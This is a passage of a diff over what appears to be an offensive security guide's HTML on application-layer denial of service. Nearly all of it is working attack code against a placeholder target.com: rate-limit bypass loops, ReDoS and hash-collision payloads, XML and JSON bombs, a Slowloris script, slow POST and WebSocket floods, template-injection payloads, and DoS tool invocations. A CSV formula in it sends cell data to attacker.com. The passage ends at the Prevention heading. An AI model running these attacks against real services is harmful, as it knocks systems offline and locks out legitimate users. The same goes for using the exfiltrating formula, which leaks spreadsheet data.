 for ip in $(cat proxy_list.txt); do
   curl -x $ip https://target.com/expensive-endpoint
-done
-</code></pre><p><strong>Header Manipulation:</strong></p>
+done</code></pre><p><strong>Header Manipulation:</strong></p>
 <pre tabindex="0"><code>X-Forwarded-For: 1.2.3.4
 X-Real-IP: 5.6.7.8
 X-Originating-IP: 9.10.11.12
 X-Remote-IP: 13.14.15.16
-X-Client-IP: 17.18.19.20
-</code></pre><p><strong>Session/Token Rotation:</strong></p>
+X-Client-IP: 17.18.19.20</code></pre><p><strong>Session/Token Rotation:</strong></p>
 <pre tabindex="0"><code>for i in range(10000):
     session = requests.Session()
     session.post(&#39;https://target.com/register&#39;, data={
         &#39;username&#39;: f&#39;user{i}&#39;,
         &#39;email&#39;: f&#39;user{i}@temp-mail.com&#39;
     })
-    session.post(&#39;https://target.com/expensive-operation&#39;)
-</code></pre><p><strong>Parameter Pollution:</strong></p>
+    session.post(&#39;https://target.com/expensive-operation&#39;)</code></pre><p><strong>Parameter Pollution:</strong></p>
 <pre tabindex="0"><code>POST /api/process?action=heavy&amp;action=light
-# Some frameworks process first, some last, some all
-</code></pre><p><strong>Case Sensitivity Bypass:</strong></p>
+# Some frameworks process first, some last, some all</code></pre><p><strong>Case Sensitivity Bypass:</strong></p>
 <pre tabindex="0"><code>/API/endpoint (if rate limit is on /api/endpoint)
 /api/Endpoint
-/api/endpoint?dummy=1
-</code></pre><h3 id="redos-regular-expression-dos">
-  <strong>ReDoS (Regular Expression DoS)</strong>
-  <a class="anchor" href="#redos-regular-expression-dos">#</a>
-</h3>
+/api/endpoint?dummy=1</code></pre><h3 id="redos-regular-expression-dos"><strong>ReDoS (Regular Expression DoS)</strong><a class="anchor" href="#redos-regular-expression-dos">#</a></h3>
 <p><strong>Vulnerable Regex Patterns:</strong></p>
 <pre tabindex="0"><code>(a+)+b          # Catastrophic backtracking
 (a*)*b
 (a|a)*b
 (a|ab)*c
 ([a-zA-Z]+)*
-^(a+)+$
-</code></pre><p><strong>Exploitation:</strong></p>
+^(a+)+$</code></pre><p><strong>Exploitation:</strong></p>
 <pre tabindex="0"><code>import requests
 
 # Target vulnerable email validation endpoint
@@ -1687,15 +1588,10 @@ payload = {
 }
 
 # This causes exponential backtracking
-requests.post(&#39;https://target.com/validate&#39;, json=payload)
-</code></pre><p><strong>Real-World Example:</strong></p>
+requests.post(&#39;https://target.com/validate&#39;, json=payload)</code></pre><p><strong>Real-World Example:</strong></p>
 <pre tabindex="0"><code># Vulnerable regex: ^([a-z]+)+$
 Input: &#34;aaaaaaaaaaaaaaaaaaaaaaaX&#34;
-# Tries exponential combinations before failing
-</code></pre><h3 id="hash-collision-attacks">
-  <strong>Hash Collision Attacks</strong>
-  <a class="anchor" href="#hash-collision-attacks">#</a>
-</h3>
+# Tries exponential combinations before failing</code></pre><h3 id="hash-collision-attacks"><strong>Hash Collision Attacks</strong><a class="anchor" href="#hash-collision-attacks">#</a></h3>
 <p><strong>Generating Colliding Keys (PHP Example):</strong></p>
 <pre tabindex="0"><code># PHP hash function collision generator
 def generate_colliding_keys(count):
@@ -1708,17 +1604,12 @@ def generate_colliding_keys(count):
 
 # Send colliding POST parameters
 data = &#39;&amp;&#39;.join([f&#39;{k}=value&#39; for k in generate_colliding_keys(10000)])
-requests.post(&#39;https://target.com/form&#39;, data=data)
-</code></pre><p><strong>JSON Hash Collision:</strong></p>
+requests.post(&#39;https://target.com/form&#39;, data=data)</code></pre><p><strong>JSON Hash Collision:</strong></p>
 <pre tabindex="0"><code>{
   &#34;Aa&#34;: 1, &#34;BB&#34;: 2,
   // These hash to same value in Java
   // Degrades O(1) to O(n)
-}
-</code></pre><h3 id="xmljson-bomb-exploitation">
-  <strong>XML/JSON Bomb Exploitation</strong>
-  <a class="anchor" href="#xmljson-bomb-exploitation">#</a>
-</h3>
+}</code></pre><h3 id="xmljson-bomb-exploitation"><strong>XML/JSON Bomb Exploitation</strong><a class="anchor" href="#xmljson-bomb-exploitation">#</a></h3>
 <p><strong>Billion Laughs Attack:</strong></p>
 <pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34;?&gt;
 &lt;!DOCTYPE lolz [
@@ -1732,8 +1623,7 @@ requests.post(&#39;https://target.com/form&#39;, data=data)
   &lt;!ENTITY lol8 &#34;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&#34;&gt;
   &lt;!ENTITY lol9 &#34;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&#34;&gt;
 ]&gt;
-&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
-</code></pre><p><strong>JSON Depth Bomb:</strong></p>
+&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre><p><strong>JSON Depth Bomb:</strong></p>
 <pre tabindex="0"><code>{
   &#34;a&#34;: {
     &#34;a&#34;: {
@@ -1742,14 +1632,9 @@ requests.post(&#39;https://target.com/form&#39;, data=data)
       }
     }
   }
-}
-</code></pre><p><strong>Quadratic Blowup (JSON):</strong></p>
+}</code></pre><p><strong>Quadratic Blowup (JSON):</strong></p>
 <pre tabindex="0"><code>[&#34;a&#34;, &#34;a&#34;, &#34;a&#34;, ... repeat 100,000 times]
-// Forces parser to reallocate array multiple times
-</code></pre><h3 id="slow-http-attacks">
-  <strong>Slow HTTP Attacks</strong>
-  <a class="anchor" href="#slow-http-attacks">#</a>
-</h3>
+// Forces parser to reallocate array multiple times</code></pre><h3 id="slow-http-attacks"><strong>Slow HTTP Attacks</strong><a class="anchor" href="#slow-http-attacks">#</a></h3>
 <p><strong>Slowloris Implementation:</strong></p>
 <pre tabindex="0"><code>import socket
 import time
@@ -1774,8 +1659,7 @@ def slowloris(target, port, connections=200):
                 s.connect((target, port))
         time.sleep(15)
 
-slowloris(&#39;target.com&#39;, 80)
-</code></pre><p><strong>Slow POST Attack:</strong></p>
+slowloris(&#39;target.com&#39;, 80)</code></pre><p><strong>Slow POST Attack:</strong></p>
 <pre tabindex="0"><code>import requests
 
 # Send POST body 1 byte every 10 seconds
@@ -1792,36 +1676,23 @@ def slow_post(url):
 
     requests.post(url, headers=headers, data=data_generator())
 
-slow_post(&#39;https://target.com/upload&#39;)
-</code></pre><h3 id="encoding-and-obfuscation">
-  <strong>Encoding and Obfuscation</strong>
-  <a class="anchor" href="#encoding-and-obfuscation">#</a>
-</h3>
+slow_post(&#39;https://target.com/upload&#39;)</code></pre><h3 id="encoding-and-obfuscation"><strong>Encoding and Obfuscation</strong><a class="anchor" href="#encoding-and-obfuscation">#</a></h3>
 <p><strong>Unicode Normalization Exploits:</strong></p>
 <pre tabindex="0"><code># Send different Unicode representations
 Username: admin (U+0061 U+0064 U+006D U+0069 U+006E)
 Username: admin (U+FF41 U+FF44 U+FF4D U+FF49 U+FF4E) # Fullwidth
-# May bypass rate limiting if normalized later
-</code></pre><p><strong>Parameter Encoding Variations:</strong></p>
+# May bypass rate limiting if normalized later</code></pre><p><strong>Parameter Encoding Variations:</strong></p>
 <pre tabindex="0"><code>POST /api/action
 action=delete
 action%3Ddelete
 action=delete%00
 action[]=delete
-action.value=delete
-</code></pre><p><strong>JSON Obfuscation:</strong></p>
+action.value=delete</code></pre><p><strong>JSON Obfuscation:</strong></p>
 <pre tabindex="0"><code>{
   &#34;data&#34;: &#34;\u0041\u0041\u0041...&#34;,  // Encoded long string
   &#34;\u0075\u0073\u0065\u0072&#34;: &#34;admin&#34;  // Encoded key
-}
-</code></pre><h2 id="advanced-attack-scenarios">
-  <strong>Advanced Attack Scenarios</strong>
-  <a class="anchor" href="#advanced-attack-scenarios">#</a>
-</h2>
-<h3 id="1-graphql-query-complexity-dos">
-  <strong>1. GraphQL Query Complexity DoS</strong>
-  <a class="anchor" href="#1-graphql-query-complexity-dos">#</a>
-</h3>
+}</code></pre><h2 id="advanced-attack-scenarios"><strong>Advanced Attack Scenarios</strong><a class="anchor" href="#advanced-attack-scenarios">#</a></h2>
+<h3 id="1-graphql-query-complexity-dos"><strong>1. GraphQL Query Complexity DoS</strong><a class="anchor" href="#1-graphql-query-complexity-dos">#</a></h3>
 <p><strong>Scenario:</strong> A GraphQL API allows nested queries without depth or complexity limits, enabling attackers to craft exponentially expensive queries.</p>
 <p><strong>Vulnerable Query:</strong></p>
 <pre tabindex="0"><code>query EvilQuery {
@@ -1842,18 +1713,13 @@ action.value=delete
       }
     }
   }
-}
-</code></pre><p><strong>Batch Query Abuse:</strong></p>
+}</code></pre><p><strong>Batch Query Abuse:</strong></p>
 <pre tabindex="0"><code>query {
   user1: user(id: 1) { ...ExpensiveFragment }
   user2: user(id: 2) { ...ExpensiveFragment }
   # ... repeat 1000 times with aliases
-}
-</code></pre><p><strong>Impact:</strong> Single request generates millions of database queries, memory exhaustion from result set accumulation, complete API unavailability within seconds.</p>
-<h3 id="2-image-processing-dos-via-pixel-flood">
-  <strong>2. Image Processing DoS via Pixel Flood</strong>
-  <a class="anchor" href="#2-image-processing-dos-via-pixel-flood">#</a>
-</h3>
+}</code></pre><p><strong>Impact:</strong> Single request generates millions of database queries, memory exhaustion from result set accumulation, complete API unavailability within seconds.</p>
+<h3 id="2-image-processing-dos-via-pixel-flood"><strong>2. Image Processing DoS via Pixel Flood</strong><a class="anchor" href="#2-image-processing-dos-via-pixel-flood">#</a></h3>
 <p><strong>Scenario:</strong> Image upload endpoint resizes images to create thumbnails without dimension validation.</p>
 <p><strong>Attack Methodology:</strong></p>
 <pre tabindex="0"><code>from PIL import Image
@@ -1863,17 +1729,12 @@ img = Image.new(&#39;RGB&#39;, (100000, 100000), color=&#39;white&#39;)
 img.save(&#39;pixel_flood.jpg&#39;, quality=1)
 
 # Server attempts to load and resize
-# Memory required: 100000 * 100000 * 3 bytes = 30GB
-</code></pre><p><strong>Decompression Bomb:</strong></p>
+# Memory required: 100000 * 100000 * 3 bytes = 30GB</code></pre><p><strong>Decompression Bomb:</strong></p>
 <pre tabindex="0"><code># Create 10,000 x 10,000 white PNG (compresses to ~100KB)
 convert -size 10000x10000 xc:white bomb.png
 
 # Upload to trigger decompression + processing
-curl -F &#34;image=@bomb.png&#34; https://target.com/upload
-</code></pre><h3 id="3-pdf-generation-resource-exhaustion">
-  <strong>3. PDF Generation Resource Exhaustion</strong>
-  <a class="anchor" href="#3-pdf-generation-resource-exhaustion">#</a>
-</h3>
+curl -F &#34;image=@bomb.png&#34; https://target.com/upload</code></pre><h3 id="3-pdf-generation-resource-exhaustion"><strong>3. PDF Generation Resource Exhaustion</strong><a class="anchor" href="#3-pdf-generation-resource-exhaustion">#</a></h3>
 <p><strong>Scenario:</strong> Report generation feature converts HTML to PDF without resource limits.</p>
 <p><strong>Exploitation:</strong></p>
 <pre tabindex="0"><code>POST /generate-invoice
@@ -1884,8 +1745,7 @@ curl -F &#34;image=@bomb.png&#34; https://target.com/upload
   ],
   &#34;include_images&#34;: true,
   &#34;format&#34;: &#34;pdf&#34;
-}
-</code></pre><p><strong>SVG Rendering DoS:</strong></p>
+}</code></pre><p><strong>SVG Rendering DoS:</strong></p>
 <pre tabindex="0"><code>&lt;!-- Inject into PDF template --&gt;
 &lt;svg width=&#34;1000&#34; height=&#34;1000&#34;&gt;
   &lt;foreignObject width=&#34;100%&#34; height=&#34;100%&#34;&gt;
@@ -1894,11 +1754,7 @@ curl -F &#34;image=@bomb.png&#34; https://target.com/upload
       &lt;div&gt;&lt;div&gt;&lt;div&gt;...[10000 levels]...&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;
     &lt;/div&gt;
   &lt;/foreignObject&gt;
-&lt;/svg&gt;
-</code></pre><h3 id="4-websocket-message-flood">
-  <strong>4. WebSocket Message Flood</strong>
-  <a class="anchor" href="#4-websocket-message-flood">#</a>
-</h3>
+&lt;/svg&gt;</code></pre><h3 id="4-websocket-message-flood"><strong>4. WebSocket Message Flood</strong><a class="anchor" href="#4-websocket-message-flood">#</a></h3>
 <p><strong>Scenario:</strong> Real-time chat application broadcasts messages to all connected users without throttling.</p>
 <p><strong>Attack Script:</strong></p>
 <pre tabindex="0"><code>const ws = new WebSocket(&#39;wss://target.com/chat&#39;);
@@ -1913,12 +1769,8 @@ ws.onopen = () =&gt; {
       }));
     }
   }, 1000);
-};
-</code></pre><p><strong>Impact:</strong> Server broadcasts message to all N connected users, O(N) amplification per message, network and CPU exhaustion.</p>
-<h3 id="5-database-connection-pool-exhaustion">
-  <strong>5. Database Connection Pool Exhaustion</strong>
-  <a class="anchor" href="#5-database-connection-pool-exhaustion">#</a>
-</h3>
+};</code></pre><p><strong>Impact:</strong> Server broadcasts message to all N connected users, O(N) amplification per message, network and CPU exhaustion.</p>
+<h3 id="5-database-connection-pool-exhaustion"><strong>5. Database Connection Pool Exhaustion</strong><a class="anchor" href="#5-database-connection-pool-exhaustion">#</a></h3>
 <p><strong>Scenario:</strong> Long-running queries hold database connections, exhausting the pool.</p>
 <p><strong>Exploitation:</strong></p>
 <pre tabindex="0"><code>import threading
@@ -1935,41 +1787,26 @@ for i in range(100):
     t.start()
     threads.append(t)
 
-# All subsequent requests will queue or timeout
-</code></pre><p><strong>SQL Injection to DoS:</strong></p>
+# All subsequent requests will queue or timeout</code></pre><p><strong>SQL Injection to DoS:</strong></p>
 <pre tabindex="0"><code># Even without data extraction, cause resource exhaustion
-UNION SELECT * FROM large_table CROSS JOIN large_table CROSS JOIN large_table;
-</code></pre><h3 id="6-cache-bypass-dos">
-  <strong>6. Cache Bypass DoS</strong>
-  <a class="anchor" href="#6-cache-bypass-dos">#</a>
-</h3>
+UNION SELECT * FROM large_table CROSS JOIN large_table CROSS JOIN large_table;</code></pre><h3 id="6-cache-bypass-dos"><strong>6. Cache Bypass DoS</strong><a class="anchor" href="#6-cache-bypass-dos">#</a></h3>
 <p><strong>Scenario:</strong> Application uses cache but allows bypass via query parameters.</p>
 <p><strong>Exploitation:</strong></p>
 <pre tabindex="0"><code># Generate unique URLs bypassing cache
 for i in {1..100000}; do
   curl &#34;https://target.com/expensive-page?cachebuster=$RANDOM&#34;
-done
-</code></pre><p><strong>Vary Header Abuse:</strong></p>
+done</code></pre><p><strong>Vary Header Abuse:</strong></p>
 <pre tabindex="0"><code>GET /page HTTP/1.1
 Host: target.com
 User-Agent: UniqueAgent-$RANDOM
 Accept-Language: en-US-$RANDOM
-# Each variation creates separate cache entry
-</code></pre><h3 id="7-template-injection-dos">
-  <strong>7. Template Injection DoS</strong>
-  <a class="anchor" href="#7-template-injection-dos">#</a>
-</h3>
+# Each variation creates separate cache entry</code></pre><h3 id="7-template-injection-dos"><strong>7. Template Injection DoS</strong><a class="anchor" href="#7-template-injection-dos">#</a></h3>
 <p><strong>Scenario:</strong> Server-side template engine processes user input without sandboxing.</p>
 <p><strong>Jinja2 DoS:</strong></p>
 <pre tabindex="0"><code># Payload causing infinite loop
 {{ &#39;&#39;.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[&#39;sys&#39;].setrecursionlimit(999999999) }}
-{{ range(999999999999) }}
-</code></pre><p><strong>Freemarker DoS:</strong></p>
-<pre tabindex="0"><code>&lt;#list 1..999999999 as i&gt;${i}&lt;/#list&gt;
-</code></pre><h3 id="8-oauthoidc-redirect-dos">
-  <strong>8. OAuth/OIDC Redirect DoS</strong>
-  <a class="anchor" href="#8-oauthoidc-redirect-dos">#</a>
-</h3>
+{{ range(999999999999) }}</code></pre><p><strong>Freemarker DoS:</strong></p>
+<pre tabindex="0"><code>&lt;#list 1..999999999 as i&gt;${i}&lt;/#list&gt;</code></pre><h3 id="8-oauthoidc-redirect-dos"><strong>8. OAuth/OIDC Redirect DoS</strong><a class="anchor" href="#8-oauthoidc-redirect-dos">#</a></h3>
 <p><strong>Scenario:</strong> OAuth callback endpoint fetches user info from authorization server.</p>
 <p><strong>Exploitation:</strong></p>
 <pre tabindex="0"><code># Create fake authorization server that responds slowly
@@ -1983,36 +1820,20 @@ def userinfo():
     time.sleep(300)  # Hold connection for 5 minutes
     return {&#34;sub&#34;: &#34;user&#34;}
 
-# Trigger OAuth flow pointing to slow server
-</code></pre><h3 id="9-ldapad-query-dos">
-  <strong>9. LDAP/AD Query DoS</strong>
-  <a class="anchor" href="#9-ldapad-query-dos">#</a>
-</h3>
+# Trigger OAuth flow pointing to slow server</code></pre><h3 id="9-ldapad-query-dos"><strong>9. LDAP/AD Query DoS</strong><a class="anchor" href="#9-ldapad-query-dos">#</a></h3>
 <p><strong>Scenario:</strong> Application performs LDAP searches based on user input.</p>
 <p><strong>Wildcard Injection:</strong></p>
 <pre tabindex="0"><code>username=*)(objectClass=*
-# Causes LDAP server to return all objects
-</code></pre><p><strong>Complex Filter:</strong></p>
+# Causes LDAP server to return all objects</code></pre><p><strong>Complex Filter:</strong></p>
 <pre tabindex="0"><code>(|(cn=*a*)(cn=*b*)(cn=*c*)...(cn=*z*))
-# Forces multiple subtree searches
-</code></pre><h3 id="10-csv-injection-leading-to-dos">
-  <strong>10. CSV Injection Leading to DoS</strong>
-  <a class="anchor" href="#10-csv-injection-leading-to-dos">#</a>
-</h3>
+# Forces multiple subtree searches</code></pre><h3 id="10-csv-injection-leading-to-dos"><strong>10. CSV Injection Leading to DoS</strong><a class="anchor" href="#10-csv-injection-leading-to-dos">#</a></h3>
 <p><strong>Scenario:</strong> Spreadsheet application processes formulas in CSV uploads.</p>
 <p><strong>Exploitation:</strong></p>
 <pre tabindex="0"><code>=1+1+1+1+...[repeat 100000 times]
 =IMPORTXML(&#34;http://slow-server.com/data&#34;)
-=WEBSERVICE(&#34;http://attacker.com/&#34;&amp;A1&amp;A2&amp;A3...)
-</code></pre><p><strong>Impact:</strong> Excel/LibreOffice hangs during import attempting to evaluate complex formulas.</p>
-<h2 id="framework-specific-scenarios">
-  <strong>Framework-Specific Scenarios</strong>
-  <a class="anchor" href="#framework-specific-scenarios">#</a>
-</h2>
-<h3 id="1-nodejs--express">
-  <strong>1. Node.js / Express</strong>
-  <a class="anchor" href="#1-nodejs--express">#</a>
-</h3>
+=WEBSERVICE(&#34;http://attacker.com/&#34;&amp;A1&amp;A2&amp;A3...)</code></pre><p><strong>Impact:</strong> Excel/LibreOffice hangs during import attempting to evaluate complex formulas.</p>
+<h2 id="framework-specific-scenarios"><strong>Framework-Specific Scenarios</strong><a class="anchor" href="#framework-specific-scenarios">#</a></h2>
+<h3 id="1-nodejs--express"><strong>1. Node.js / Express</strong><a class="anchor" href="#1-nodejs--express">#</a></h3>
 <p><strong>Event Loop Blocking:</strong></p>
 <pre tabindex="0"><code>// Vulnerable endpoint
 app.get(&#39;/compute&#39;, (req, res) =&gt; {
@@ -2024,19 +1845,14 @@ app.get(&#39;/compute&#39;, (req, res) =&gt; {
 });
 
 // Attack
-GET /compute?iterations=999999999999
-</code></pre><p><strong>ReDoS in Routes:</strong></p>
+GET /compute?iterations=999999999999</code></pre><p><strong>ReDoS in Routes:</strong></p>
 <pre tabindex="0"><code>// Vulnerable regex in route
 app.get(/^\/user\/([a-z]+)+$/, (req, res) =&gt; {
   // Handler
 });
 
 // Attack URL
-GET /user/aaaaaaaaaaaaaaaaaaaaaaaaaaX
-</code></pre><h3 id="2-python--django">
-  <strong>2. Python / Django</strong>
-  <a class="anchor" href="#2-python--django">#</a>
-</h3>
+GET /user/aaaaaaaaaaaaaaaaaaaaaaaaaaX</code></pre><h3 id="2-python--django"><strong>2. Python / Django</strong><a class="anchor" href="#2-python--django">#</a></h3>
 <p><strong>Queryset DoS:</strong></p>
 <pre tabindex="0"><code># Vulnerable view
 def search(request):
@@ -2045,17 +1861,12 @@ def search(request):
     return render(request, &#39;results.html&#39;, {&#39;results&#39;: results})
 
 # Attack
-GET /search?q=%  # Full table scan without limit
-</code></pre><p><strong>Template Rendering DoS:</strong></p>
+GET /search?q=%  # Full table scan without limit</code></pre><p><strong>Template Rendering DoS:</strong></p>
 <pre tabindex="0"><code># Vulnerable template with user input
 {{ user_input|safe }}
 
 # Inject deeply nested template syntax
-{% for i in range(999999999) %}{{ i }}{% endfor %}
-</code></pre><h3 id="3-java--spring-boot">
-  <strong>3. Java / Spring Boot</strong>
-  <a class="anchor" href="#3-java--spring-boot">#</a>
-</h3>
+{% for i in range(999999999) %}{{ i }}{% endfor %}</code></pre><h3 id="3-java--spring-boot"><strong>3. Java / Spring Boot</strong><a class="anchor" href="#3-java--spring-boot">#</a></h3>
 <p><strong>Jackson JSON Bomb:</strong></p>
 <pre tabindex="0"><code>// Vulnerable deserialization
 @PostMapping(&#34;/api/data&#34;)
@@ -2064,18 +1875,13 @@ public void process(@RequestBody Map&lt;String, Object&gt; data) {
 }
 
 // Attack payload
-{ &#34;a&#34;: { &#34;a&#34;: { &#34;a&#34;: { ... [10000 levels] } } } }
-</code></pre><p><strong>HikariCP Pool Exhaustion:</strong></p>
+{ &#34;a&#34;: { &#34;a&#34;: { &#34;a&#34;: { ... [10000 levels] } } } }</code></pre><p><strong>HikariCP Pool Exhaustion:</strong></p>
 <pre tabindex="0"><code>// Long transaction holds connection
 @Transactional
 public void processData(String input) {
     // Trigger slow query
     jdbcTemplate.query(&#34;SELECT SLEEP(30)&#34;, ...);
-}
-</code></pre><h3 id="4-ruby--rails">
-  <strong>4. Ruby / Rails</strong>
-  <a class="anchor" href="#4-ruby--rails">#</a>
-</h3>
+}</code></pre><h3 id="4-ruby--rails"><strong>4. Ruby / Rails</strong><a class="anchor" href="#4-ruby--rails">#</a></h3>
 <p><strong>ActiveRecord N+1 DoS:</strong></p>
 <pre tabindex="0"><code># Vulnerable controller
 def index
@@ -2084,18 +1890,13 @@ def index
 end
 
 # Attack: Create thousands of users
-# Each page load triggers thousands of queries
-</code></pre><p><strong>Symbol DoS (older Rails):</strong></p>
+# Each page load triggers thousands of queries</code></pre><p><strong>Symbol DoS (older Rails):</strong></p>
 <pre tabindex="0"><code># Symbols aren&#39;t garbage collected in Ruby &lt; 2.2
 params[:user][:some_dynamic_key]
 
 # Attack: Send unique keys
 POST /users with user[key_1]=value, user[key_2]=value, ...
-# Memory grows until crash
-</code></pre><h3 id="5-php">
-  <strong>5. PHP</strong>
-  <a class="anchor" href="#5-php">#</a>
-</h3>
+# Memory grows until crash</code></pre><h3 id="5-php"><strong>5. PHP</strong><a class="anchor" href="#5-php">#</a></h3>
 <p><strong>PHP Hash Collision:</strong></p>
 <pre tabindex="0"><code>// Vulnerable $_POST processing
 foreach($_POST as $key =&gt; $value) {
@@ -2103,8 +1904,7 @@ foreach($_POST as $key =&gt; $value) {
 }
 
 // Attack: Send colliding keys
-POST with key1=val&amp;key2=val&amp;...[10000 colliding keys]
-</code></pre><p><strong>Session File Flood:</strong></p>
+POST with key1=val&amp;key2=val&amp;...[10000 colliding keys]</code></pre><p><strong>Session File Flood:</strong></p>
 <pre tabindex="0"><code>// Each session creates file
 session_start();
 
@@ -2112,15 +1912,8 @@ session_start();
 for i in {1..1000000}; do
   curl -c /dev/null https://target.com/
 done
-# Exhausts inodes or disk space
-</code></pre><h2 id="detection-techniques">
-  <strong>Detection Techniques</strong>
-  <a class="anchor" href="#detection-techniques">#</a>
-</h2>
-<h3 id="manual-testing-methodology">
-  <strong>Manual Testing Methodology</strong>
-  <a class="anchor" href="#manual-testing-methodology">#</a>
-</h3>
+# Exhausts inodes or disk space</code></pre><h2 id="detection-techniques"><strong>Detection Techniques</strong><a class="anchor" href="#detection-techniques">#</a></h2>
+<h3 id="manual-testing-methodology"><strong>Manual Testing Methodology</strong><a class="anchor" href="#manual-testing-methodology">#</a></h3>
 <p><strong>1. Resource Consumption Analysis:</strong></p>
 <pre tabindex="0"><code>**# Baseline measurement**
 time curl https://target.com/api/search?q=test
@@ -2129,8 +1922,7 @@ time curl https://target.com/api/search?q=test
 time curl https://target.com/api/search?q=$(python -c &#39;print(&#34;a&#34;*10000)&#39;)
 
 # Monitor CPU/memory during request
-htop # or similar monitoring tool
-</code></pre><p><strong>2. Response Time Profiling:</strong></p>
+htop # or similar monitoring tool</code></pre><p><strong>2. Response Time Profiling:</strong></p>
 <pre tabindex="0"><code>import requests
 import time
 
@@ -2155,14 +1947,12 @@ payloads = [
     {&#39;q&#39;: &#39;a&#39; * 10000},
 ]
 
-results = profile_endpoint(&#39;https://target.com/search&#39;, payloads)
-</code></pre><p><strong>3. Connection Limit Testing:</strong></p>
+results = profile_endpoint(&#39;https://target.com/search&#39;, payloads)</code></pre><p><strong>3. Connection Limit Testing:</strong></p>
 <pre tabindex="0"><code>**# Test max concurrent connections**
 ab -n 10000 -c 1000 https://target.com/
 
 **# Monitor connection exhaustion**
-netstat -an | grep ESTABLISHED | wc -l
-</code></pre><p><strong>4. ReDoS Pattern Detection:</strong></p>
+netstat -an | grep ESTABLISHED | wc -l</code></pre><p><strong>4. ReDoS Pattern Detection:</strong></p>
 <pre tabindex="0"><code>**# Test regex endpoints with crafted inputs**
 import requests
 test_cases = [
@@ -2176,19 +1966,14 @@ for test in test_cases:
     requests.post(&#39;https://target.com/validate&#39;, json={&#39;email&#39;: test + &#39;X&#39;})
     print(f&#34;Length{len(test)}:{time.time() - start}s&#34;)
 
-# Exponential growth indicates ReDoS
-</code></pre><p><strong>5. File Upload Bomb Testing:</strong></p>
+# Exponential growth indicates ReDoS</code></pre><p><strong>5. File Upload Bomb Testing:</strong></p>
 <pre tabindex="0"><code>**# Create test files of increasing size**
 dd if=/dev/zero of=test_1mb.bin bs=1M count=1
 dd if=/dev/zero of=test_10mb.bin bs=1M count=10
 dd if=/dev/zero of=test_100mb.bin bs=1M count=100
 
 **# Upload and monitor server behavior**
-curl -F &#34;file=@test_100mb.bin&#34; https://target.com/upload
-</code></pre><h3 id="automated-testing-tools">
-  <strong>Automated Testing Tools</strong>
-  <a class="anchor" href="#automated-testing-tools">#</a>
-</h3>
+curl -F &#34;file=@test_100mb.bin&#34; https://target.com/upload</code></pre><h3 id="automated-testing-tools"><strong>Automated Testing Tools</strong><a class="anchor" href="#automated-testing-tools">#</a></h3>
 <p><strong>1. Slowloris:</strong></p>
 <pre tabindex="0"><code>**# Installation**
 git clone https://github.com/gkbrk/slowloris.git
@@ -2198,20 +1983,17 @@ cd slowloris
 python3 slowloris.py target.com
 
 **# Advanced usage**
-python3 slowloris.py target.com -s 500 -p 443 --https
-</code></pre><p><strong>2. Hulk (HTTP Unbearable Load King):</strong></p>
+python3 slowloris.py target.com -s 500 -p 443 --https</code></pre><p><strong>2. Hulk (HTTP Unbearable Load King):</strong></p>
 <pre tabindex="0"><code>**# Clone repository**
 git clone https://github.com/grafov/hulk.git
 
 **# Run attack**
-python hulk.py https://target.com
-</code></pre><p><strong>3. GoldenEye:</strong></p>
+python hulk.py https://target.com</code></pre><p><strong>3. GoldenEye:</strong></p>
 <pre tabindex="0"><code>**# Download**
 wget https://github.com/jseidl/GoldenEye/raw/master/goldeneye.py
 
 **# HTTP DoS test**
-python goldeneye.py https://target.com -w 50 -s 100
-</code></pre><p><strong>4. Custom Automation with Python:</strong></p>
+python goldeneye.py https://target.com -w 50 -s 100</code></pre><p><strong>4. Custom Automation with Python:</strong></p>
 <pre tabindex="0"><code>import requests
 import concurrent.futures
 import time
@@ -2243,8 +2025,7 @@ def dos_test(url, method=&#39;GET&#39;, data=None, iterations=1000):
     print(f&#34;Requests/sec:{iterations/duration:.2f}&#34;)
 
 # Test example
-dos_test(&#39;https://target.com/api/expensive-operation&#39;, iterations=5000)
-</code></pre><p><strong>5. Apache JMeter:</strong></p>
+dos_test(&#39;https://target.com/api/expensive-operation&#39;, iterations=5000)</code></pre><p><strong>5. Apache JMeter:</strong></p>
 <pre tabindex="0"><code>&lt;!-- Thread Group for load testing --&gt;
 &lt;ThreadGroup guiclass=&#34;ThreadGroupGui&#34; testclass=&#34;ThreadGroup&#34; testname=&#34;DoS Test&#34;&gt;
   &lt;intProp name=&#34;ThreadGroup.num_threads&#34;&gt;1000&lt;/intProp&gt;
@@ -2257,8 +2038,7 @@ dos_test(&#39;https://target.com/api/expensive-operation&#39;, iterations=5000)
   &lt;stringProp name=&#34;HTTPSampler.domain&#34;&gt;target.com&lt;/stringProp&gt;
   &lt;stringProp name=&#34;HTTPSampler.path&#34;&gt;/api/search&lt;/stringProp&gt;
   &lt;stringProp name=&#34;HTTPSampler.method&#34;&gt;POST&lt;/stringProp&gt;
-&lt;/HTTPSamplerProxy&gt;
-</code></pre><p><strong>6. Vegeta (HTTP load testing):</strong></p>
+&lt;/HTTPSamplerProxy&gt;</code></pre><p><strong>6. Vegeta (HTTP load testing):</strong></p>
 <pre tabindex="0"><code># Install
 go get -u github.com/tsenart/vegeta
 
@@ -2266,11 +2046,7 @@ go get -u github.com/tsenart/vegeta
 echo &#34;GET https://target.com/expensive&#34; &gt; targets.txt
 
 # Attack for 30 seconds at 1000 req/sec
-vegeta attack -targets=targets.txt -rate=1000 -duration=30s | vegeta report
-</code></pre><h2 id="impact">
-  Impact
-  <a class="anchor" href="#impact">#</a>
-</h2>
+vegeta attack -targets=targets.txt -rate=1000 -duration=30s | vegeta report</code></pre><h2 id="impact">Impact<a class="anchor" href="#impact">#</a></h2>
 <ul>
 <li>Application becomes completely unresponsive → legitimate users locked out → business operations halt → direct revenue loss from downtime.</li>
 <li>Response times degrade from milliseconds to minutes → user frustration spikes → abandoned transactions → permanent brand reputation damage.</li>
@@ -2284,10 +2060,7 @@ vegeta attack -targets=targets.txt -rate=1000 -duration=30s | vegeta report
 <li>Extended downtime violates data availability regulations → GDPR/HIPAA compliance violations → regulatory fines → mandatory security audits.</li>
 </ul>
 <hr>
-<h2 id="prevention">
-  Prevention
-  <a class="anchor" href="#prevention">#</a>
-</h2>
